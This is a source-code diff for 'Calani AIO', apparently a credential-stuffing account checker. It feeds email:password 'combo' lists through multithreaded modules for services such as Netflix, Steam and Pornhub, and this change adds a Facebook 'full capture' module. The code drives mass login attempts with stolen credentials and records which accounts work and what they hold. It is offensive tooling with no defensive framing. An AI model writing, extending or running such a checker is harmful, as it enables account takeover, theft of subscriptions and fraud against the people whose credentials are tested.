@@ -28,6 +28,7 @@ from modules.checkers import dominos
 from modules.checkers import dickeys
 from modules.checkers import hotspot_shield
 from modules.checkers import netflix
+from modules.checkers import facebook
 
 modules_list = {
     "bww [points capture | proxyless]":bww,
@@ -46,6 +47,7 @@ modules_list = {
     "steam [full capture]":steam,
     "netflix [full capture]":netflix,
     "paramount [full capture]":paramount,
+    "facebook [full capture]":facebook,
     "plextv [subscription capture]":plextv,
     "crunchyroll [subscription capture]":crunchyroll,
     "pornhub [subscription capture]":pornhub,
@@ -57,27 +59,39 @@ modules_list = {
 }
 
 def starter(selected_modules:list):
-    """Starts checking accounts"""
+    """
+    Starts checking accounts using the selected modules
+    
+    starter([ipvanish])
+    """
     reset_stats()
     set_title(f"Calani AIO | Getting Ready | {discord_name}")
-    def initializeChecker(account:str):
+    
+    def start_checking(account:str):
+        if Checker.stopping: return
+        def add_cpm():
+            if Checker.stopping: return
+            Checker.cpm += 60
+
+        
         if ':' in account:
             email,password = account.split(":",1)
+            
             if email and password:
                 for module in selected_modules:
                     modules_list[module].check(email,password)
-                    Checker.cpm += 60
+                    add_cpm()
+                
                 Checker.remaining.remove(account)
                 return
         
         Checker.remaining.remove(account)
-        Checker.cpm += 60
+        add_cpm()
         Checker.bad += 1
         
 
     clear()
     ascii()
-    print("\n\n")
     print(f"    [{cyan}>{reset}] Pick Combo File")
     file_path = get_file("Combo File",type="Combo File")
     if not file_path:
@@ -135,32 +149,23 @@ def starter(selected_modules:list):
     total_modules = len(selected_modules)
     if not Checker.cui:
         ascii()
-        print("\n\n")
     else: Thread(target=cui,args=(total_modules,),daemon=True).start()
     if Checker.total_proxies > Checker.threads: Checker.lockProxies = True
-    mainpool = Pool(processes=Checker.threads)
-    mainpool.imap_unordered(func=initializeChecker,iterable=Checker.accounts)
-    mainpool.close()
-    mainpool.join()
+    Hotkeys.start_recording()
+
+    Checker.pool = Pool(processes=Checker.threads)
+    Checker.pool.imap_unordered(func=start_checking,iterable=Checker.accounts)
+    Checker.pool.close()
+    Checker.pool.join()
+    
     Checker.checking = False
     sleep(0.2)
     clear()
     ascii()
-    modules_string = '\n    '.join([module.title().split(' ')[0] for module in selected_modules])
-    print(f"""
-            
-    [{cyan}{total_modules} Modules{reset}]
-    {cyan}
-    {modules_string}
-    {reset}
-
-    {'Hits'.center(11,' ')}{fg(8)}-{reset}  {fg(2)}{numerize(Checker.good)}{reset}
+    print(f"""    {'Hits'.center(11,' ')}{fg(8)}-{reset}  {fg(2)}{numerize(Checker.good)}{reset}
     {'Custom'.center(11,' ')}{fg(8)}-{reset}  {fg(3)}{numerize(Checker.custom)}{reset}
-    {'Bad'.center(11,' ')}{fg(8)}-{reset}  {fg(1)}{numerize(Checker.bad)}{reset}
-
-    """)
+    {'Bad'.center(11,' ')}{fg(8)}-{reset}  {fg(1)}{numerize(Checker.bad)}{reset}""")
     save_path = os.path.join(os.getcwd(),f'Results\\{Checker.time}')
-    print("\n\n")
-    print(f"    [{cyan}>{reset}] Finished Checking")
+    print(f"\n\n    [{cyan}>{reset}] Finished Checking")
     print(f"    [{cyan}>{reset}] Saved to \"{save_path}\"")
     input(f"    [{cyan}>{reset}] Press Enter To Go Back")
